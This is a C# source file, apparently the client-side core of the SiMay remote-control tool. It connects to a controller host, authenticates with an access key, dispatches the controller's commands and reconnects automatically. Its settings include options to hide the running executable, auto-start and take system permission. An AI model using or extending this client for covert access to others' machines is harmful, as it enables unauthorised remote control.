using SiMay.Basic;
using SiMay.Core;
using SiMay.Net.SessionProvider;
using SiMay.Net.SessionProvider.Providers;
using SiMay.RemoteService.Loader;
using SiMay.Sockets.Tcp;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SiMay.Service.Core
{
    public class MainApplicationServiceBase : ApplicationProtocolService
    {
        /// <summary>
        /// 正常
        /// </summary>
        private const int STATE_NORMAL = 1;

        /// <summary>
        /// 断开
        /// </summary>
        private const int STATE_DISCONNECT = 0;


        private int _currentSessionStatus = STATE_DISCONNECT;//主连接状态

        /// <summary>
        /// 等待分配会话序列
        /// </summary>
        private AwaitTaskSequence _taskAwaitSequence = new AwaitTaskSequence();

        /// <summary>
        /// 启动参数
        /// </summary>
        public StartParameter StartParameter { get; set; }

        /// <summary>
        /// 会话提供
        /// </summary>
        public TcpClientSessionProvider SessionProvider { get; set; }

        /// <summary>
        /// 远程服务器地址
        /// </summary>
        public IPEndPoint RemoteIPEndPoint { get; set; }

        public IDictionary<string, RemoteSimpleServiceBase> SimpleServiceCollection
            => SimpleServiceHelper.SimpleServiceCollection;

        /// <summary>
        /// 启动主服务
        /// </summary>
        /// <param name="startParameter"></param>
        /// <param name="clientAgent"></param>
        /// <param name="session"></param>
        /// <param name="serviceIPEndPoint"></param>
        public void StartService(SessionProviderContext session)
        {
            _currentSessionStatus = STATE_NORMAL;//主连接状态

            this.SetSession(session);

            session.AppTokens = new object[2]
            {
                SessionKind.MAIN_SERVICE_SESSION,
                null
            };

            AppConfiguartion.HostAddress = StartParameter.Host;
            AppConfiguartion.HostPort = StartParameter.Port;
            AppConfiguartion.AccessKey = StartParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = StartParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = StartParameter.GroupName;
            AppConfiguartion.IsAutoRun = StartParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = StartParameter.IsHide;
            AppConfiguartion.RunTime = StartParameter.RunTimeText;
            AppConfiguartion.Version = StartParameter.ServiceVersion;
            AppConfiguartion.MiddleServiceMode = StartParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = StartParameter.UniqueId;
            AppConfiguartion.ServerIPEndPoint = RemoteIPEndPoint;
            AppConfiguartion.ServiceDisplayName = StartParameter.ServiceDisplayName;
            AppConfiguartion.ServiceName = StartParameter.ServiceName;
            AppConfiguartion.SystemPermission = StartParameter.SystemPermission;
        }

        private void ConnectToServer()
        {
            //尝试解析出最新的域名地址
            ThreadHelper.ThreadPoolStart(c =>
            {
                var ip = HostHelper.GetHostByName(AppConfiguartion.HostAddress);
                if (ip.IsNullOrEmpty())
                    return;
                AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), AppConfiguartion.HostPort);
            });
            SessionProvider.ConnectAsync(AppConfiguartion.ServerIPEndPoint);
        }

        /// <summary>
        /// 发送确认包
        /// 作用：连接确认，以便服务端识别这是一个有效的工作连接，type = 中间服务器识别 ， accessId = 发起创建应用服务请求的主控端标识
        /// </summary>
        /// <param name="session"></param>
        private void SendACK(SessionProviderContext session, SessionKind type, long accessId)
        {
            session.SendTo(MessageHead.C_GLOBAL_CONNECT,
                new AcknowledPacket()
                {
                    AccessId = accessId,//当前主控端标识
                    AccessKey = AppConfiguartion.AccessKey,
                    Type = (byte)type,
                    AssemblyLoad = true
                });
        }

        /// <summary>
        /// 通信库主消息处理函数
        /// </summary>
        /// <param name="notify"></param>
        /// <param name="session"></param>
        public void Notify(TcpSessionNotify notify, SessionProviderContext session)
        {
            try
            {
                switch (notify)
                {
                    case TcpSessionNotify.OnConnected:
                        this.ConnectedHandler(session, notify);
                        break;
                    case TcpSessionNotify.OnDataReceiveing:
                        break;
                    case TcpSessionNotify.OnDataReceived:
                        var workType = (SessionKind)session.AppTokens[0];

                        //主服务与应用服务同步调用简单程序
                        if ((workType == SessionKind.MAIN_SERVICE_SESSION || workType == SessionKind.APP_SERVICE_SESSION) && session.GetMessageHead() == MessageHead.S_GLOBAL_SIMPLEAPP_SYNC_CALL)
                        {
                            var callSyncRequest = session.GetMessageEntity<CallSyncPacket>();
                            session.CompletedBuffer = callSyncRequest.Datas;

                            var maping = SimpleServiceHelper.SimpleServiceTargetHeadMaping;
                            var messageHead = session.GetMessageHead();
                            if (maping.TryGetValue(messageHead.ConvertTo<int>(), out var remoteSimpleService))
                            {
                                var callTupleResult = remoteSimpleService.HandlerBinder.CallFunctionPacketHandler(session, messageHead, remoteSimpleService, out var returnEntity);
                                if (callTupleResult.successed)
                                {
                                    var syncResultPacket = new CallSyncResultPacket
                                    {
                                        Id = callSyncRequest.Id,
                                        Datas = returnEntity.IsNull() ? Array.Empty<byte>() : SiMay.Serialize.Standard.PacketSerializeHelper.SerializePacket(returnEntity),
                                        IsOK = callTupleResult.successed
                                    };
                                    session.SendTo(MessageHead.C_GLOBAL_SYNC_RESULT, syncResultPacket);
                                }
                            }
                            else
                            {
                                LogHelper.WriteErrorByCurrentMethod($"the calling simple service messageHead:{messageHead.ConvertTo<int>()} was not found!");
                            }
                        }
                        else if (workType == SessionKind.MAIN_SERVICE_SESSION)
                        {
                            var messageHead = session.GetMessageHead();
                            var operationResult = this.HandlerBinder.CallFunctionPacketHandler(session, messageHead, this);
                            if (!operationResult.successed)
                                LogHelper.WriteErrorByCurrentMethod(operationResult.ex);
                        }
                        else if (workType == SessionKind.APP_SERVICE_SESSION)
                        {
                            var appService = session.AppTokens[1].ConvertTo<ApplicationRemoteService>();

                            var messageHead = session.GetMessageHead();
                            var operationResult = appService.HandlerBinder.CallFunctionPacketHandler(session, messageHead, appService);
                            if (!operationResult.successed)
                                LogHelper.WriteErrorByCurrentMethod(operationResult.ex);
                        }
                        break;
                    case TcpSessionNotify.OnClosed:
                        this.CloseHandler(session, notify);
                        break;
                }
            }
            catch (Exception ex)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(ex.Message);
                sb.Append(ex.StackTrace);
                LogHelper.WriteErrorByCurrentMethod(sb.ToString());

                Console.WriteLine(ex.Message);
            }

        }

        /// <summary>
        /// 连接初始化
        /// 
        /// 作用：分配工作类型
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        private void ConnectedHandler(SessionProviderContext session, TcpSessionNotify notify)
        {
            //当服务主连接离线或未连接，优先与session关联
            if (Interlocked.Exchange(ref _currentSessionStatus, STATE_NORMAL) == STATE_DISCONNECT)
            {
                session.AppTokens = new object[2]
                {
                    SessionKind.MAIN_SERVICE_SESSION,
                    null
                };
                this.SetSession(session);
                //服务主连接accessId保留
                this.SendACK(session, SessionKind.MAIN_SERVICE_SESSION, 0);
            }
            else
            {
                ApplicationRemoteService service = _taskAwaitSequence.Dequeue();
                if (service.IsNull())
                {
                    //找不到服务。。
                    session.SessionClose(false);
                    return;
                }
                session.AppTokens = new object[2]
                {
                    SessionKind.APP_SERVICE_SESSION,
                    service
                };
                service.SetSession(session);

                this.SendACK(session, SessionKind.APP_SERVICE_SESSION, service.AccessId);
            }

        }
        private void CloseHandler(SessionProviderContext session, TcpSessionNotify notify)
        {
            if (_currentSessionStatus == STATE_DISCONNECT && session.AppTokens.IsNull())
            {
                //服务主连接断开或未连接
                session.AppTokens = new object[2]
                {
                    SessionKind.MAIN_SERVICE_SESSION,
                    null
                };
            }
            else if (_currentSessionStatus == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
            {
                _taskAwaitSequence.Dequeue();
                return;//不重试连接，因为可能会连接不上，导致频繁重试连接
            }

            var workType = (SessionKind)session.AppTokens[0];
            if (workType == SessionKind.MAIN_SERVICE_SESSION)
            {
                //清除主连接会话信息
                this.SetSession(null);
                Interlocked.Exchange(ref _currentSessionStatus, STATE_DISCONNECT);

                var timer = new System.Timers.Timer();
                timer.Interval = 5000;
                timer.Elapsed += (s, e) =>
                {
                    //主连接重连
                    ConnectToServer();

                    timer.Stop();
                    timer.Dispose();
                };
                timer.Start();
            }
            else if (workType == SessionKind.APP_SERVICE_SESSION)
            {
                var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                if (appService.WhetherClosed)
                    return;
                appService.WhetherClosed = true;
                appService.SessionClosed();
            }
        }


        /// <summary>
        /// 将服务加入到等待队列并发起工作连接
        /// </summary>
        /// <param name="service"></param>
        protected void PostToAwaitSequence(ApplicationRemoteService service)
        {
            this._taskAwaitSequence.Enqueue(service);
            this.ConnectToServer();
        }
    }
}
